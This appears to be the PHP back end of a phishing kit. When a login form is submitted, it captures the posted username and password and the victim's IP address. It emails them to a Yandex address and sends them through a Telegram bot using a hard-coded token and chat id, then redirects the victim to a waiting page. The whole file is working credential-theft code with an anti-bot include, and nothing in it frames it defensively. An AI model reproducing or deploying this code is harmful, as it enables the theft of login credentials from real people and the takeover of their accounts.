<?php
if(isset($_POST["username"]) && isset($_POST["password"])){
	include('antibots.php');
	session_start();
	error_reporting(0);
	include('get_browser.php');
	include('get_ip.php');
	include('get_lang');
	$back = "wait.php";
	$ip = getenv("REMOTE_ADDR");
	
	$message = "";
	$message .= "username : ".$_POST['username']."\n";
	$message .= "password : ".$_POST['password']."\n";
	$send = "yand1x11@yandex.com";
	$subject = "$ip";
	$cn = $_SESSION['_forlogin_'];
	$headers = "From:ar user <reality@superhosting.bg>";
	mail($send,$subject,$message,$headers);
		$token = "5347410366:AAG4Y9rs4cvCASdkTYcSx3xl4PxQG9LXKL0";
$data = [
    'text' => $message,
    'chat_id' => '-706752114'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

	header("Location: $back");
}
else{
	echo 'No thing to see here :(';
}
?>